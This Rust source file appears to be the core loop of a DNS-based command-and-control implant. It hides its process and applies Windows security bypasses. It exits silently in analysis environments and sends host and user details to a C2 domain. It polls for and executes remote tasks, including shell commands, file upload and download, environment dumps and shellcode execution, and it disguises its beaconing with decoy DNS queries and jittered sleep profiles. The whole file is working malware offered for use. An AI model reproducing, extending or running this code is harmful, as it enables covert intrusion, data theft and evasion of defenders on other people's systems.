pub mod selfupdate;

use crate::c2::{self, C2Error, SessionInfo, Task, TaskResponse, TaskStatus};
use crate::crypto::EncryptionKey;
use crate::dns::DnsBackend;
use crate::evasion;
use crate::traffic::shaping::{self, TrafficProfile};
use log::{error, info, warn};

/// Traffic profile presets exposed to CLI
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ProfilePreset {
    /// Low latency, higher detection risk
    Aggressive,
    /// Balanced — default
    Default,
    /// High latency, blends with business traffic
    Stealthy,
    /// Extremely slow, minimal footprint
    Paranoid,
}

impl std::str::FromStr for ProfilePreset {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "aggressive" => Ok(ProfilePreset::Aggressive),
            "default" | "normal" => Ok(ProfilePreset::Default),
            "stealthy" | "stealth" => Ok(ProfilePreset::Stealthy),
            "paranoid" => Ok(ProfilePreset::Paranoid),
            _ => Err(format!("unknown profile: {s} (try: aggressive, default, stealthy, paranoid)")),
        }
    }
}

impl ProfilePreset {
    pub fn to_traffic_profile(self) -> TrafficProfile {
        match self {
            ProfilePreset::Aggressive => TrafficProfile::aggressive(),
            ProfilePreset::Default => TrafficProfile::default(),
            ProfilePreset::Stealthy => TrafficProfile::stealthy(),
            ProfilePreset::Paranoid => TrafficProfile::paranoid(),
        }
    }
}

/// Jitter strategy for beacon timing.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum JitterStrategy {
    /// Linear jitter: base +/- (base * pct). Default.
    Linear,
    /// Exponential jitter: base * 2^random(0, pct).
    Exponential,
    /// Adaptive jitter: shorter during business hours (09-17),
    /// longer and more random during off-hours.
    Adaptive,
    /// Bursty: occasionally sends multiple rapid beacons,
    /// then goes silent for a longer period.
    Bursty,
}

impl std::str::FromStr for JitterStrategy {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "linear" => Ok(JitterStrategy::Linear),
            "exponential" | "exp" => Ok(JitterStrategy::Exponential),
            "adaptive" => Ok(JitterStrategy::Adaptive),
            "bursty" | "burst" => Ok(JitterStrategy::Bursty),
            _ => Err(format!(
                "unknown jitter strategy: {s} (try: linear, exponential, adaptive, bursty)"
            )),
        }
    }
}

impl std::fmt::Display for JitterStrategy {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            JitterStrategy::Linear => write!(f, "linear"),
            JitterStrategy::Exponential => write!(f, "exponential"),
            JitterStrategy::Adaptive => write!(f, "adaptive"),
            JitterStrategy::Bursty => write!(f, "bursty"),
        }
    }
}

pub struct AgentConfig {
    pub domain: String,
    pub key: EncryptionKey,
    pub session_id: String,
    pub poll_interval_secs: u64,
    pub jitter_pct: f64,
    pub jitter_strategy: JitterStrategy,
    /// Anti-analysis confidence threshold (0.0 = disabled, 0.3 = moderate, 0.7 = strict)
    pub paranoia: f64,
    /// Traffic shaping profile
    pub traffic_profile: TrafficProfile,
    /// Enable polymorphic encoding on C2 payloads
    pub encode_c2: bool,
}

pub async fn run(
    backend: &dyn DnsBackend,
    config: &AgentConfig,
) -> Result<(), C2Error> {
    // ─── Process masquerade + evasion on startup ───
    evasion::masquerade::masquerade();
    #[cfg(target_os = "windows")]
    {
        crate::evasion::runtime::windows::apply_all_bypasses();
    }

    // ─── Anti-analysis gate ───
    if config.paranoia > 0.0 {
        let report = evasion::anti_analysis::run_all_checks();
        if report.confidence >= config.paranoia {
            info!("environment check failed (confidence={:.0}%), exiting silently",
                report.confidence * 100.0);
            return Ok(());
        }
        info!("environment check passed (confidence={:.0}%, threshold={:.0}%)",
            report.confidence * 100.0, config.paranoia * 100.0);
    }

    // ─── Check in ───
    let info = SessionInfo {
        session_id: config.session_id.clone(),
        hostname: get_hostname(),
        username: get_username(),
        os: get_os(),
        arch: std::env::consts::ARCH.to_string(),
        pid: std::process::id(),
        first_seen: now(),
        last_seen: now(),
    };

    c2::check_in(backend, &config.domain, &config.key, &info).await?;
    info!("checked in: session={}", config.session_id);

    // ─── Main loop ───
    loop {
        match c2::poll_task(backend, &config.domain, &config.key, &config.session_id).await {
            Ok(Some(task)) => {
                info!("task: {} [{}]", task.command, task.task_id);

                let response = execute(&task);

                if let Err(e) = c2::submit_response(
                    backend,
                    &config.domain,
                    &config.key,
                    &config.session_id,
                    &response,
                )
                .await
                {
                    error!("failed to submit response: {e}");
                }

                if let Err(e) =
                    c2::clear_task(backend, &config.domain, &config.session_id).await
                {
                    warn!("failed to clear task: {e}");
                }

                if task.command == "exit" {
                    info!("exit received, shutting down");
                    break;
                }
            }
            Ok(None) => {
                // No task — heartbeat
                if let Err(e) = c2::heartbeat(
                    backend,
                    &config.domain,
                    &config.key,
                    &config.session_id,
                )
                .await
                {
                    warn!("heartbeat failed: {e}");
                }
            }
            Err(e) => {
                warn!("poll error: {e}");
            }
        }

        // ─── Fire decoy DNS queries ───
        let decoys = config.traffic_profile.generate_decoy_schedule();
        if !decoys.is_empty() {
            tokio::spawn(async move {
                fire_decoy_queries(decoys).await;
            });
        }

        // ─── Obfuscated sleep with traffic shaping ───
        let sleep_duration = config.traffic_profile.next_sleep_duration();
        info!("sleeping {:.1}s", sleep_duration.as_secs_f64());

        let sleep_dur = sleep_duration;
        tokio::task::spawn_blocking(move || {
            std::thread::sleep(sleep_dur);
        }).await.unwrap_or_else(|e| {
            warn!("sleep task failed: {e}");
        });
    }

    Ok(())
}

/// Fire decoy DNS queries to blend C2 traffic with legitimate lookups.
async fn fire_decoy_queries(schedule: Vec<(u64, String)>) {
    use std::net::UdpSocket;

    for (delay_ms, domain) in schedule {
        if delay_ms > 0 {
            tokio::time::sleep(tokio::time::Duration::from_millis(delay_ms)).await;
        }

        let domain_clone = domain.clone();
        tokio::task::spawn_blocking(move || {
            if let Ok(sock) = UdpSocket::bind("0.0.0.0:0") {
                sock.set_read_timeout(Some(std::time::Duration::from_secs(2))).ok();
                let pkt = build_simple_dns_query(&domain_clone);
                let _ = sock.send_to(&pkt, "127.0.0.53:53")
                    .or_else(|_| sock.send_to(&pkt, "8.8.8.8:53"));
                let mut buf = [0u8; 512];
                let _ = sock.recv(&mut buf);
            }
        });
    }
}

/// Build a minimal DNS A query packet for decoy queries.
fn build_simple_dns_query(name: &str) -> Vec<u8> {
    let txid: u16 = rand::random();
    let mut pkt = Vec::with_capacity(64);
    pkt.extend_from_slice(&txid.to_be_bytes());
    pkt.extend_from_slice(&[0x01, 0x00]); // flags: standard query, RD
    pkt.extend_from_slice(&[0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
    for label in name.split('.') {
        let len = label.len().min(63); // DNS label max is 63 bytes
        pkt.push(len as u8);
        pkt.extend_from_slice(&label.as_bytes()[..len]);
    }
    pkt.push(0); // root
    pkt.extend_from_slice(&[0x00, 0x01, 0x00, 0x01]); // A record, IN class
    pkt
}

fn execute(task: &Task) -> TaskResponse {
    let (status, output) = match task.command.as_str() {
        "shell" => c2::commands::shell(&task.args),
        "ls" => c2::commands::ls(&task.args),
        "cat" => c2::commands::cat(&task.args),
        "pwd" => c2::commands::pwd(),
        "whoami" => c2::commands::whoami(),
        "ps" => c2::commands::ps(),
        "env" => c2::commands::env_cmd(),
        "download" => c2::commands::download(&task.args),
        "id" => c2::commands::id(),
        "hostname" => c2::commands::hostname(),
        "netstat" => c2::commands::netstat(),
        "upload" => c2::commands::upload(&task.args),
        "sysinfo" => c2::commands::sysinfo(),
        "execute-shellcode" => c2::commands::execute_shellcode(&task.args),
        "exit" => (TaskStatus::Success, "shutting down".to_string()),
        other => (TaskStatus::Error, format!("unknown command: {other}")),
    };

    TaskResponse {
        task_id: task.task_id.clone(),
        status,
        output,
        timestamp: now(),
    }
}

// ─── Cross-platform system info helpers ───

fn get_hostname() -> String {
    #[cfg(target_os = "windows")]
    {
        std::env::var("COMPUTERNAME")
            .unwrap_or_else(|_| "unknown".to_string())
    }

    #[cfg(not(target_os = "windows"))]
    {
        std::fs::read_to_string("/etc/hostname")
            .map(|s| s.trim().to_string())
            .or_else(|_| {
                std::process::Command::new("hostname")
                    .output()
                    .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
            })
            .unwrap_or_else(|_| "unknown".to_string())
    }
}

fn get_username() -> String {
    std::env::var("USER")
        .or_else(|_| std::env::var("LOGNAME"))
        .or_else(|_| std::env::var("USERNAME")) // Windows
        .unwrap_or_else(|_| "unknown".to_string())
}

fn get_os() -> String {
    #[cfg(target_os = "windows")]
    {
        std::process::Command::new("cmd")
            .args(["/c", "ver"])
            .output()
            .ok()
            .and_then(|o| {
                let s = String::from_utf8_lossy(&o.stdout).trim().to_string();
                if s.is_empty() { None } else { Some(s) }
            })
            .unwrap_or_else(|| "Windows".to_string())
    }

    #[cfg(target_os = "linux")]
    {
        std::fs::read_to_string("/etc/os-release")
            .ok()
            .and_then(|s| {
                s.lines()
                    .find(|l| l.starts_with("PRETTY_NAME="))
                    .map(|l| {
                        l.trim_start_matches("PRETTY_NAME=")
                            .trim_matches('"')
                            .to_string()
                    })
            })
            .unwrap_or_else(|| std::env::consts::OS.to_string())
    }

    #[cfg(target_os = "macos")]
    {
        std::process::Command::new("sw_vers")
            .arg("-productVersion")
            .output()
            .ok()
            .map(|o| format!("macOS {}", String::from_utf8_lossy(&o.stdout).trim()))
            .unwrap_or_else(|| "macOS".to_string())
    }

    #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
    {
        std::env::consts::OS.to_string()
    }
}

fn now() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs()
}
